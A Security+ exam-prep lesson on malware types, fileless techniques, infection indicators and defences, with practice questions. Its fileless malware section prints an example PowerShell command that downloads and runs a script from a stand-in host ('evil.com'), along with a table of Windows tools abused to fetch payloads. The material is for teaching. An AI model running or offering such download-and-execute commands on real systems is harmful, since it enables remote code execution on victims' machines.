# Lesson 7: Malware Types and Indicators

**Estimated Time:** 30-35 minutes  
**Domain:** 2.0 Threats, Vulnerabilities, and Mitigations (22% of exam)  
**Exam Objectives Covered:** 2.1 - Compare and contrast common threat vectors and attack surfaces

---

## Learning Objectives

By the end of this lesson, you will be able to:
- Define malware and explain its role in cyberattacks
- Identify and differentiate between malware types (virus, worm, trojan, ransomware, rootkit, etc.)
- Explain how each malware type spreads and operates
- Describe fileless malware and why it evades traditional detection
- Recognize Potentially Unwanted Programs (PUPs) and bloatware
- Identify common indicators of malware infection
- Apply malware knowledge to detection and response scenarios
- Recommend appropriate defenses against different malware types

---

## Video Resources

- **Professor Messer:** "Security+ SY0-701 - Malware Types" (14 min)
- **PowerCert:** "Types of Malware Explained" (12 min)
- **NetworkChuck:** "Malware Analysis Basics" (15 min)

---

## Introduction

May 2017: A hospital in the UK can't access patient records. Ambulances are diverted. Surgeries are cancelled. Across the hall, doctors scribble prescriptions by hand because the pharmacy system is down. In the parking lot, staff gather around smartphones trying to understand what's happening.

Within hours, the same scene repeats across 150 countries. FedEx can't track packages. Renault halts production lines. Telefonica employees are told to shut down computers immediately. Russian banks, Chinese universities, and Indian airlines all report the same thing: computers locked, files encrypted, a red screen demanding Bitcoin.

WannaCry ransomware had escaped.

The attack exploited EternalBlue, a Windows vulnerability allegedly developed by the NSA and leaked online weeks earlier. WannaCry combined this exploit with worm capability—it didn't need users to click anything. Once it infected one computer on a network, it automatically scanned for and infected others. A single point of entry could compromise an entire organization in minutes.

The damage was staggering: over 200,000 computers infected, billions in damages, and healthcare systems disrupted during critical moments. One British hospital reported that a patient's cancer surgery was cancelled because records were inaccessible.

WannaCry wasn't sophisticated by nation-state standards. It wasn't targeted. It was a blunt instrument that spread indiscriminately, crippling whatever it touched. And it demonstrated what security professionals had warned for years: organizations that don't patch vulnerabilities and don't prepare for malware face catastrophic consequences.

Understanding malware—how it works, how it spreads, how to detect it—is fundamental to security. Whether you're defending networks, responding to incidents, or advising organizations, you need to recognize what you're facing. Let's examine the malware landscape.

---

## What Is Malware?

Malware (malicious software) is any software intentionally designed to cause damage, steal information, or gain unauthorized access. It's the weapon of choice for cybercriminals, nation-states, and hacktivists.

### Malware Objectives

**Data theft:** Steal credentials, financial information, intellectual property, personal data

**Financial gain:** Ransomware payments, banking fraud, cryptocurrency mining

**System damage:** Destroy data, disrupt operations, sabotage infrastructure

**Espionage:** Monitor activities, exfiltrate intelligence, maintain persistent access

**Resource hijacking:** Use victim's computing power for cryptomining, DDoS attacks, spam distribution

### Malware Delivery Methods

Malware reaches victims through various vectors:

- **Email attachments:** Malicious documents, executables disguised as invoices
- **Malicious links:** URLs leading to drive-by downloads or exploit kits
- **Compromised websites:** Legitimate sites injected with malicious code
- **Software downloads:** Trojanized applications, fake updates
- **Removable media:** Infected USB drives
- **Network propagation:** Worms spreading through vulnerabilities
- **Supply chain:** Compromised software updates from trusted vendors

---

## Malware Types: Know Your Enemy

Different malware types behave differently and require different defenses. Understanding the distinctions is essential.

### Virus

A virus is malicious code that attaches to legitimate programs or files and executes when the host runs. Viruses cannot spread on their own—they require user action (running the infected file).

**Characteristics:**
- Requires host file to attach to
- Spreads when infected file is executed or shared
- User action required for propagation
- Can infect executables, documents (macro viruses), boot sectors

**Types of viruses:**
- **File infector:** Attaches to executable programs (.exe, .com)
- **Macro virus:** Embedded in documents (Word, Excel macros)
- **Boot sector virus:** Infects master boot record, loads before OS
- **Polymorphic virus:** Changes its code to evade detection
- **Metamorphic virus:** Completely rewrites itself while maintaining function

**Spread method:** User runs infected program, opens infected document, boots from infected media

**Example scenario:** Employee receives email with "Invoice.docx" attachment. Opening the document executes a macro that downloads additional malware.

### Worm

A worm is self-replicating malware that spreads automatically across networks without requiring user action or host files.

**Characteristics:**
- Self-contained (no host file needed)
- Self-replicating (creates copies of itself)
- Self-propagating (spreads without user action)
- Exploits network vulnerabilities or services
- Can spread extremely rapidly

**Key difference from virus:** Viruses need users to spread them (running infected files). Worms spread themselves automatically through networks.

**Spread method:** Exploits vulnerabilities in network services, uses default credentials, leverages network shares

**Famous worms:**
- **Code Red (2001):** Exploited IIS vulnerability, infected 359,000 servers in 14 hours
- **Slammer (2003):** Exploited SQL Server, doubled infections every 8.5 seconds
- **Conficker (2008):** Exploited Windows vulnerability, infected millions
- **WannaCry (2017):** Combined ransomware with worm capability via EternalBlue

**Why worms are dangerous:** Speed. A worm can compromise thousands of systems before defenders even know an attack is happening.

### Trojan (Trojan Horse)

A trojan disguises itself as legitimate software to trick users into installing it. Unlike viruses and worms, trojans don't self-replicate—they rely on deception.

**Characteristics:**
- Appears to be legitimate/useful software
- Does NOT self-replicate
- Requires user to install it
- Performs malicious actions hidden from user
- Often creates backdoors for continued access

**Common trojan disguises:**
- Free games or software
- Cracked/pirated applications
- Fake antivirus ("Your computer is infected! Download this fix!")
- Fake software updates
- Utilities promising system optimization

**What trojans do once installed:**
- Install backdoors for remote access
- Steal credentials and data
- Download additional malware
- Join botnets
- Enable cryptocurrency mining

**Example scenario:** User searches for free video editing software, downloads from unofficial site. The installer includes hidden malware that steals browser passwords and installs a backdoor.

### Remote Access Trojan (RAT)

A RAT is a trojan specifically designed to give attackers remote control over infected systems.

**Capabilities:**
- Full remote desktop control
- Webcam and microphone activation
- Keylogging
- File access and exfiltration
- Screenshot capture
- Password theft
- Further malware deployment

**RAT characteristics:**
- Designed to be stealthy (avoid detection)
- Maintains persistent access
- Command and control (C2) communication
- Often used in targeted attacks

**Notable RATs:** DarkComet, njRAT, Poison Ivy, Gh0st RAT

RATs are favorites of both cybercriminals and nation-state actors for maintaining long-term access to compromised systems.

### Ransomware

Ransomware encrypts victim's files and demands payment (usually cryptocurrency) for decryption keys.

**How ransomware works:**
1. Infection (phishing, exploit, RDP compromise)
2. Execution and privilege escalation
3. Encryption of files (documents, databases, backups)
4. Ransom note display with payment instructions
5. Victim pays (or doesn't) for decryption key

**Ransomware evolution:**

**Early ransomware:** Locked screens with fake "police" warnings. Often easily bypassed.

**Crypto-ransomware:** Actually encrypts files with strong encryption. Recovery without key is nearly impossible.

**Double extortion:** Encrypts files AND exfiltrates data. Pay or we publish your stolen data.

**Triple extortion:** Encryption + data theft + DDoS attacks or threatening customers/partners.

**Ransomware-as-a-Service (RaaS):** Criminal developers create ransomware platforms. Affiliates deploy it and split profits. Professional criminal enterprises.

**Notable ransomware:**
- **CryptoLocker (2013):** Pioneered crypto-ransomware
- **WannaCry (2017):** Worm + ransomware, global impact
- **NotPetya (2017):** Disguised as ransomware but actually destructive wiper
- **REvil/Sodinokibi:** Major RaaS operation, massive payouts
- **LockBit:** Currently one of most active ransomware groups

**Why ransomware is so prevalent:** It works. Organizations pay millions because the alternative (business disruption, data loss) is worse.

### Spyware

Spyware monitors user activity and sends information to attackers without user knowledge or consent.

**What spyware collects:**
- Browsing history and habits
- Keystrokes (when combined with keylogger)
- Credentials and form data
- Screenshots
- Email and messages
- Microphone/webcam recordings
- Location data

**Types:**
- **Tracking cookies:** Monitor browsing across sites (less malicious, often for advertising)
- **System monitors:** Comprehensive activity surveillance
- **Stalkerware:** Spyware targeting individuals (domestic abuse tool)
- **Commercial spyware:** "Legitimate" employee/child monitoring tools (can be abused)

**Delivery:** Often bundled with free software, installed by attackers with access, or deployed through phishing.

### Keylogger

A keylogger records keystrokes, capturing everything typed including passwords, messages, and sensitive data.

**Types:**
- **Software keylogger:** Program running on system
- **Hardware keylogger:** Physical device between keyboard and computer
- **Acoustic keylogger:** Analyzes sound of typing to determine keys pressed
- **Kernel-level keylogger:** Operates at OS kernel level, very difficult to detect

**What keyloggers capture:**
- Usernames and passwords
- Credit card numbers
- Private messages
- Search queries
- Documents being written

**Defense considerations:** Hardware keyloggers aren't detected by antivirus. Physical security matters.

### Rootkit

A rootkit hides deep within the operating system, concealing itself and other malware from detection.

**Characteristics:**
- Designed for stealth above all
- Modifies OS to hide presence
- Survives reboots
- Extremely difficult to detect and remove
- Often requires OS reinstallation to fully remove

**Rootkit types by location:**

**User-mode rootkit:** Runs at application level. Easier to detect and remove.

**Kernel-mode rootkit:** Runs at OS kernel level. Very difficult to detect—rootkit can intercept and modify any system call.

**Bootkit:** Infects boot process (MBR, VBR, or UEFI). Loads before OS, can hide from OS entirely.

**Firmware rootkit:** Infects hardware firmware (BIOS, NIC firmware). Survives OS reinstallation. Extremely persistent.

**Why rootkits are dangerous:** If you can't detect malware, you can't remove it. Rootkits enable long-term undetected persistence.

### Backdoor

A backdoor provides unauthorized access to a system, bypassing normal authentication.

**Backdoor types:**
- **Installed by malware:** Trojan creates backdoor for later access
- **Hardcoded by developers:** Intentional access method left in software (sometimes legitimate for support, often exploited)
- **Created by attackers:** After initial compromise, attackers install persistent access

**Backdoor characteristics:**
- Bypasses authentication
- Provides remote access
- Often hidden/disguised
- Enables return access even after initial vulnerability is patched

**Example:** Attacker exploits vulnerability to gain initial access. They install a backdoor (hidden user account, web shell, scheduled task running RAT). When vulnerability is patched, they still have access through the backdoor.

### Logic Bomb

A logic bomb is malicious code that triggers when specific conditions are met.

**Trigger conditions:**
- Specific date/time ("activate on January 1st")
- User action ("activate when user opens this file")
- System state ("activate if my username is deleted")
- Absence of action ("activate if I don't log in for 30 days")

**Logic bomb characteristics:**
- Dormant until trigger
- Often planted by insiders
- Difficult to detect before activation
- Payload varies (data destruction, backdoor activation, etc.)

**Classic scenario:** Disgruntled IT employee plants logic bomb to destroy data if their account is deleted. They're fired, account is removed, bomb triggers—data lost.

### Botnet

A botnet is a network of compromised computers (bots/zombies) controlled by an attacker (botmaster).

**Botnet uses:**
- **DDoS attacks:** Coordinated traffic flooding
- **Spam distribution:** Millions of emails from distributed sources
- **Credential stuffing:** Automated login attempts from many IPs
- **Cryptocurrency mining:** Distributed mining using victim resources
- **Click fraud:** Automated ad clicking
- **Malware distribution:** Spreading additional malware

**Botnet architecture:**
- **Centralized:** Bots connect to command-and-control (C2) server. Single point of failure.
- **Peer-to-peer:** Bots communicate with each other. No central server to take down.

**Botnet scale:** Large botnets contain millions of compromised devices. Mirai botnet (2016) comprised IoT devices and launched record-breaking DDoS attacks.

---

## Fileless Malware: Living Off the Land

Fileless malware operates entirely in memory, using legitimate system tools instead of dropping files to disk.

### Why Fileless Malware Is Dangerous

Traditional antivirus scans files on disk. Fileless malware never creates files—it lives in memory and abuses trusted system tools.

**Characteristics:**
- No malicious files to scan
- Uses legitimate tools (PowerShell, WMI, .NET)
- Runs in memory only
- Often survives only until reboot (some achieve persistence through registry/scheduled tasks)
- Evades file-based detection

### How Fileless Malware Works

**Common techniques:**

**PowerShell abuse:** Malicious commands executed through PowerShell, downloading and running code directly in memory.

```powershell
powershell -encodedcommand [Base64 payload]
powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

**WMI (Windows Management Instrumentation):** Legitimate admin tool used for persistence and execution.

**Macro to memory execution:** Document macro downloads and executes payload in memory without writing to disk.

**Process injection:** Malicious code injected into legitimate running processes.

**Registry residence:** Malicious code stored in registry, executed at startup without file.

### Living Off the Land Binaries (LOLBins)

Fileless malware abuses legitimate Windows tools:

| Tool | Legitimate Use | Malicious Abuse |
|------|----------------|-----------------|
| PowerShell | System administration | Download/execute payloads |
| WMI | System management | Persistence, lateral movement |
| certutil | Certificate management | Download files |
| mshta | HTML application host | Execute malicious scripts |
| regsvr32 | Register DLLs | Execute remote scripts |
| rundll32 | Run DLL functions | Execute malicious DLLs |

**Detection challenge:** These tools are legitimate. Blocking them breaks administration. Detection must focus on how they're used, not that they're used.

---

## Potentially Unwanted Programs (PUPs)

PUPs aren't strictly malware but exhibit unwanted behaviors that degrade system security or user experience.

### What Makes a PUP

- Installed without clear user consent (bundled with other software)
- Difficult to uninstall
- Changes browser settings without permission
- Displays unwanted advertisements
- Collects data without clear disclosure
- Degrades system performance

### Common PUP Types

**Adware:** Displays unwanted advertisements. May track browsing for targeted ads. Often bundled with free software.

**Browser hijackers:** Change default search engine, homepage, or new tab page without consent. Redirect searches through their servers.

**Toolbars:** Unwanted browser toolbars. Often come with "free" software. May track browsing and display ads.

**System "optimizers":** Claim to speed up system but provide little value. May display fake problems to scare users into purchasing.

### Why PUPs Matter for Security

- Create attack surface (vulnerable software installed)
- May download additional unwanted software
- Some "PUPs" are actually malware in disguise
- Degrade security posture
- Indicate user may have poor security habits (downloading from untrusted sources)

---

## Bloatware

Bloatware refers to unwanted software pre-installed on systems by manufacturers.

**Common bloatware:**
- Trial versions of software
- Manufacturer utilities with limited value
- Third-party applications (games, antivirus trials)
- Duplicate functionality (manufacturer backup tool when Windows has built-in)

**Security concerns:**
- Increased attack surface (more software = more potential vulnerabilities)
- May run background services consuming resources
- Some bloatware has contained actual vulnerabilities (Lenovo Superfish incident)
- Updates may not be maintained

**Best practice:** Clean install of OS or removal of bloatware on new systems.

---

## Indicators of Malware Infection

Recognizing infection indicators enables faster detection and response.

### System Performance Indicators

- **Slow performance:** System unusually sluggish
- **High resource usage:** CPU, memory, or disk at high utilization without explanation
- **Frequent crashes:** System or application instability
- **Slow boot times:** Startup takes longer than normal
- **Fans running constantly:** High CPU from hidden processes

### Network Indicators

- **Unusual network traffic:** Unexpected connections, high bandwidth usage
- **Connections to unknown IPs:** Especially to known malicious addresses
- **DNS requests to suspicious domains:** Random-looking domain names (DGA domains)
- **Traffic at odd hours:** Significant network activity when system should be idle
- **Blocked outbound connections:** Firewall blocking connection attempts to C2 servers

### User Experience Indicators

- **Pop-ups and advertisements:** Especially outside of browsers
- **Browser changes:** Homepage, search engine, or new tabs changed
- **New toolbars or extensions:** Browser add-ons user didn't install
- **Redirected searches:** Searches going through different engine
- **Programs user didn't install:** Unknown applications appearing
- **Security software disabled:** Antivirus turned off or won't start

### File System Indicators

- **Missing files:** Files deleted or moved
- **Encrypted files:** Files inaccessible with ransom note
- **Modified files:** Unexpected changes to documents or executables
- **New unknown files:** Especially in system directories or startup locations
- **Changed file extensions:** Files renamed (document.docx.encrypted)

### Security Tool Indicators

- **Antivirus alerts:** Detection of malware signatures
- **Firewall blocks:** Blocked suspicious connection attempts
- **IDS/IPS alerts:** Detected malicious network patterns
- **EDR detection:** Endpoint detection and response tool alerts
- **SIEM correlation:** Multiple related suspicious events

### Account and Authentication Indicators

- **Locked accounts:** Repeated failed login attempts
- **Password changes:** Passwords changed without user action
- **New user accounts:** Unknown accounts created
- **Privilege escalation:** User account suddenly has admin rights
- **Unusual login times:** Account active at strange hours

---

## Malware Defense Strategies

### Prevention

- **Keep systems patched:** Most worms exploit known vulnerabilities
- **Email filtering:** Block malicious attachments and links
- **Web filtering:** Block known malicious sites
- **User training:** Recognize phishing and social engineering
- **Application whitelisting:** Only allow approved software to run
- **Least privilege:** Limit user permissions to reduce malware impact
- **Network segmentation:** Contain spread of worms

### Detection

- **Antivirus/anti-malware:** Signature and behavior-based detection
- **EDR (Endpoint Detection and Response):** Advanced endpoint monitoring
- **Network monitoring:** Detect C2 communications and lateral movement
- **SIEM:** Correlate events across environment
- **Behavioral analysis:** Detect anomalous process behavior
- **Sandbox analysis:** Detonate suspicious files safely

### Response

- **Isolation:** Disconnect infected systems from network
- **Forensics:** Understand what happened and what's affected
- **Eradication:** Remove all traces of malware
- **Recovery:** Restore from clean backups
- **Lessons learned:** Improve defenses based on incident

---

## Key Exam Tips

🎯 **Virus vs. Worm:** Virus requires host file and user action. Worm is self-replicating and spreads automatically through networks.

🎯 **Trojan characteristics:** Disguises as legitimate software. Does NOT self-replicate. Relies on deception.

🎯 **Ransomware evolution:** Know double extortion (encrypt + steal data) and RaaS (Ransomware-as-a-Service).

🎯 **Rootkit purpose:** Stealth. Hides itself and other malware. Kernel-mode rootkits are hardest to detect.

🎯 **Fileless malware:** Uses legitimate tools (PowerShell, WMI). Lives in memory. Evades file-based detection.

🎯 **Logic bomb trigger:** Specific condition (date, action, absence of action). Often insider threat.

🎯 **RAT capabilities:** Full remote control—screen, camera, microphone, files, keylogging.

🎯 **Indicators of infection:** Know performance, network, user experience, and file system indicators.

---

## Key Takeaways

- [ ] Virus attaches to host files and requires user action to spread
- [ ] Worm self-replicates and spreads automatically across networks
- [ ] Trojan disguises as legitimate software—does not self-replicate
- [ ] RAT (Remote Access Trojan) provides attackers full remote control
- [ ] Ransomware encrypts files and demands payment—often combined with data theft (double extortion)
- [ ] Spyware monitors user activity and exfiltrates information
- [ ] Keyloggers capture keystrokes including passwords and sensitive data
- [ ] Rootkits hide deep in OS to avoid detection—kernel-mode and bootkits are most dangerous
- [ ] Backdoors provide persistent unauthorized access bypassing authentication
- [ ] Logic bombs trigger on specific conditions—often planted by insiders
- [ ] Botnets are networks of compromised systems used for DDoS, spam, and other attacks
- [ ] Fileless malware operates in memory using legitimate tools (LOLBins)
- [ ] PUPs exhibit unwanted behaviors but may not be strictly malicious
- [ ] Infection indicators include performance issues, network anomalies, and unexpected system changes
- [ ] Defense requires prevention (patching, filtering), detection (AV, EDR), and response capabilities

---

## Check Your Understanding

**1. A hospital's computers suddenly display a red screen demanding Bitcoin payment. Files across network shares are encrypted with .encrypted extensions. Ambulances are being diverted. What type of malware is this, and what immediate actions should be taken?**

<details>
<summary>Show Answer</summary>
<strong>Ransomware attack.</strong> The encryption of files with ransom demand is the defining characteristic. 

<strong>Immediate actions:</strong>
1. <strong>Isolate:</strong> Disconnect affected systems from network to stop spread
2. <strong>Identify scope:</strong> Determine what's encrypted and what's still clean
3. <strong>Preserve evidence:</strong> Don't wipe systems yet—forensics needed
4. <strong>Activate incident response:</strong> Follow IR plan, notify appropriate parties
5. <strong>Check backups:</strong> Assess backup integrity (attackers often target backups)
6. <strong>Don't pay immediately:</strong> Evaluate options; paying doesn't guarantee recovery
7. <strong>Report:</strong> Law enforcement (FBI), regulatory bodies if required (HIPAA for healthcare)

The diversion of ambulances makes this a patient safety issue requiring emergency protocols beyond IT.
</details>

**2. An IT administrator notices their antivirus can't detect anything wrong, but Task Manager shows high CPU usage from a process that disappears when investigated. The system seems to hide what's running. What type of malware characteristic does this suggest?**

<details>
<summary>Show Answer</summary>
<strong>Rootkit behavior.</strong> The hallmarks are: (1) Antivirus finds nothing (rootkit hiding malware from security tools), (2) Process disappears when investigated (rootkit intercepting system calls and hiding processes), (3) System seems to conceal what's running.

Rootkits modify the operating system to hide themselves and other malware. Kernel-mode rootkits can intercept any system query, showing clean results while malware runs hidden.

<strong>Response:</strong> Boot from known-clean media (live CD/USB) and scan. Use anti-rootkit tools that examine system at low level. Consider the system compromised—may require complete reinstallation from clean media. Preserve evidence before wiping.
</details>

**3. Malware is spreading through the corporate network extremely fast. No users clicked any links—it's jumping from computer to computer automatically by exploiting an unpatched Windows vulnerability. Is this a virus or a worm? Explain your reasoning.**

<details>
<summary>Show Answer</summary>
<strong>This is a worm.</strong> Key differentiators:

<strong>Worm indicators:</strong>
- Self-propagating (spreading automatically without user action)
- Exploiting network vulnerability to spread
- No user clicks or file execution needed
- Rapid spread across network

<strong>Why NOT a virus:</strong>
- Virus requires host file to attach to
- Virus spreads when user executes infected file
- Virus cannot spread on its own without user action

This behavior matches WannaCry and similar network worms. The automatic exploitation of vulnerabilities to spread without user interaction is the defining characteristic of worms. Immediate response: isolate network segments, emergency patching, identify patient zero.
</details>

**4. A security analyst observes PowerShell processes making HTTP connections to unknown external IPs. The commands are Base64 encoded. Antivirus reports no malicious files. What type of malware technique is this?**

<details>
<summary>Show Answer</summary>
<strong>Fileless malware / Living off the Land (LOLBins).</strong>

<strong>Indicators:</strong>
- PowerShell (legitimate tool) making suspicious connections
- Base64 encoding (common obfuscation for fileless payloads)
- No malicious files detected (operating in memory)
- HTTP connections to unknown IPs (likely C2 communication)

Fileless malware uses legitimate system tools to avoid file-based detection. PowerShell is the most commonly abused tool. The payload downloads and executes in memory without writing files to disk.

<strong>Detection approach:</strong> PowerShell logging (Script Block Logging, Module Logging), behavioral analysis, network monitoring for C2, EDR with memory analysis capability. File-based antivirus alone won't catch this.
</details>

**5. Compare and contrast a backdoor and a RAT. How are they similar and different?**

<details>
<summary>Show Answer</summary>
<strong>Similarities:</strong>
- Both provide unauthorized remote access
- Both bypass normal authentication
- Both can be installed by attackers after initial compromise
- Both enable persistent access

<strong>Differences:</strong>

<strong>Backdoor:</strong>
- General term for any unauthorized access method
- May be simple (hidden account, web shell, open port)
- May provide limited functionality
- Can be intentional (developer backdoor) or malicious
- Focus is access path, not control interface

<strong>RAT (Remote Access Trojan):</strong>
- Specific type of trojan malware
- Comprehensive remote control tool with GUI
- Full feature set: screen control, keylogging, webcam, file access, etc.
- Always malicious
- Provides attacker with complete control interface

<strong>Relationship:</strong> A RAT creates a backdoor, but not all backdoors are RATs. A simple SSH key planted by an attacker is a backdoor but not a RAT. A RAT is a full-featured backdoor with extensive control capabilities.
</details>

**6. A user installs free video editing software downloaded from an unofficial site. Soon after, their browser homepage changes, search results are redirected, and popup ads appear. Is this malware? What type?**

<details>
<summary>Show Answer</summary>
<strong>This is a Trojan bundled with PUPs (Potentially Unwanted Programs).</strong>

<strong>Trojan aspect:</strong> The "free software" was disguised as legitimate but contained malicious/unwanted components. User was deceived into installing it.

<strong>PUP components:</strong>
- Browser hijacker (changed homepage, redirected searches)
- Adware (popup ads)
- Possibly spyware (tracking for ad targeting)

<strong>Why this matters:</strong> While PUPs are often classified separately from "malware," the delivery mechanism (trojan) and the unwanted behaviors (hijacking, ads) are security concerns. The source (unofficial site) is a red flag.

<strong>Prevention:</strong> Download from official sources only, read installation prompts carefully, use reputable antivirus that detects PUPs, train users about safe download practices.
</details>

**7. An organization discovers a script that will delete all database records if a specific employee's Active Directory account no longer exists. The employee is currently on a performance improvement plan. What type of malware is this?**

<details>
<summary>Show Answer</summary>
<strong>Logic bomb.</strong>

<strong>Characteristics matching logic bomb:</strong>
- Dormant until specific condition (account deletion)
- Malicious payload (database deletion)
- Insider threat (employee planted it)
- Condition-based trigger (not time-based, but absence-based)

This is a classic insider threat scenario. The employee anticipated being fired (performance improvement plan often precedes termination) and planted a logic bomb to retaliate when their account is removed.

<strong>Response:</strong>
1. Preserve evidence (don't delete the script yet—forensics)
2. Disable the script safely
3. Review all systems/scripts the employee has access to
4. Consider HR/legal implications
5. If termination proceeds, ensure comprehensive access review before account deletion
6. Document everything for potential legal action
</details>

**8. Security monitoring shows internal hosts making DNS requests for domains like "x7kj2m9p.com" at regular intervals. The domains resolve to different IPs each day. What might this indicate?**

<details>
<summary>Show Answer</summary>
<strong>Likely botnet activity with Domain Generation Algorithm (DGA).</strong>

<strong>Indicators:</strong>
- Random-looking domain names (characteristic of DGA)
- Regular intervals (beaconing behavior—bots checking in)
- Multiple internal hosts (botnet infection spread)
- Dynamic IP resolution (attackers rotating infrastructure)

<strong>DGA explanation:</strong> Malware generates domain names algorithmically. Attackers register a few expected domains each day. This evades static blocklists—can't block domains that don't exist yet.

<strong>Investigation:</strong>
1. Identify all hosts making these requests (scope of infection)
2. Block DNS to suspicious domains at DNS level
3. Isolate infected systems
4. Analyze malware to determine botnet family
5. Check for data exfiltration or other malicious activity
6. Clean or reimage infected systems
</details>

**9. What is the difference between a crypto-ransomware attack and a double extortion ransomware attack?**

<details>
<summary>Show Answer</summary>
<strong>Crypto-ransomware:</strong>
- Encrypts victim's files
- Demands ransom for decryption key
- Single extortion: "Pay or lose your files"
- Backup recovery defeats the attack (if backups exist)

<strong>Double extortion ransomware:</strong>
- Encrypts victim's files AND
- Exfiltrates (steals) data before encryption
- Two extortion threats: "Pay or (1) lose your files AND (2) we publish your stolen data"
- Backups don't fully defeat it—data publication threat remains

<strong>Evolution:</strong> Double extortion emerged because organizations improved backups. Attackers adapted by stealing data first, creating additional leverage. Even organizations with good backups face pressure—leaked customer data, trade secrets, or embarrassing information causes damage regardless of backup status.

<strong>Triple extortion:</strong> Some groups add DDoS attacks or direct threats to customers/partners as third lever.
</details>

**10. List five indicators that might suggest a workstation is infected with malware.**

<details>
<summary>Show Answer</summary>
<strong>Performance indicators:</strong>
1. Unexplained slow performance or high CPU/memory usage
2. System crashes or frequent application errors

<strong>Network indicators:</strong>
3. Unusual network traffic or connections to unknown external IPs
4. Firewall blocking unexpected outbound connection attempts

<strong>User experience indicators:</strong>
5. Browser homepage or search engine changed without user action
6. Unexpected pop-ups or advertisements
7. New programs or browser extensions user didn't install

<strong>Security tool indicators:</strong>
8. Antivirus disabled or won't start/update
9. Security tool alerts or detections

<strong>File system indicators:</strong>
10. Missing, modified, or encrypted files
11. Unknown files appearing in system directories

Any single indicator might have innocent explanation, but multiple indicators together strongly suggest infection. Security teams should investigate when users report these symptoms.
</details>

---

## Next Lesson Preview

In **Lesson 8: Social Engineering Attacks**, we'll explore how attackers exploit human psychology rather than technical vulnerabilities. You'll learn about phishing, spear phishing, vishing, smishing, and pretexting—the techniques that trick people into revealing credentials, transferring money, or installing malware. Social engineering is the most common initial attack vector, and understanding it is essential for both defense and user training.

---

✅ **Lesson 7 Complete**

**Progress:** 7 of 30 lessons complete (23.3%)

---

*Next up: Lesson 8 - Social Engineering Attacks*